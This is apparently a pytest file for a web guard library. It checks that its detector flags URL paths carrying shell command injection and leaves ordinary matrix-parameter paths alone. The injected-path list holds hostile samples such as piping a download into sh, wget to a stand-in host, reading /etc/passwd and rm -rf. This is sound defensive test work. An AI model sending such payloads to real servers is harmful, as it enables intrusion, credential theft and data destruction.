import pytest

from guard_core.models import SecurityConfig
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

INJECTED_PATHS = [
    "/api/ping/x;id",
    "/api/ping/x|whoami",
    "/api/ping/x && curl evil.sh | sh",
    "/api/ping/127.0.0.1;cat /etc/passwd",
    "/api/ping/x%3Bid",
    "/api/ping/x%7Cwhoami",
    "/api/ping/x%3Bcat%20%2Fetc%2Fpasswd",
    "/api/ping/x%26%26wget%20http://evil.example/a",
    "/search/curl;wget",
    "/run/x; rm -rf /tmp/y",
]

ORDINARY_PATHS = [
    "/users;id=5/profile",
    "/shirts;color=red;size=m",
    "/a|b/c",
    "/a;sh=1",
    "/docs;ls.txt",
    "/a;id/b",
    "/api/x;jsessionid=ABC123",
    "/a&b/c",
    "/catalog/ls;",
    "/news/curl is a tool; wget is another",
    "/books/war&peace",
    "/q/a;idx",
]


def _flagged(path: str) -> bool:
    request = SyncMockGuardRequest(path=path)
    return (detect_penetration_attempt(request, SecurityConfig())).is_threat


@pytest.mark.parametrize("path", INJECTED_PATHS)
def test_a_command_after_a_separator_in_the_path_is_flagged(path: str) -> None:
    assert _flagged(path) is True


@pytest.mark.parametrize("path", ORDINARY_PATHS)
def test_matrix_parameters_and_bare_separators_in_the_path_stay_clean(
    path: str,
) -> None:
    assert _flagged(path) is False


def test_the_path_row_is_flagged_as_command_injection() -> None:
    request = SyncMockGuardRequest(path="/api/ping/x;id")

    result = detect_penetration_attempt(request, SecurityConfig())

    assert "cmd_injection" in result.threat_categories
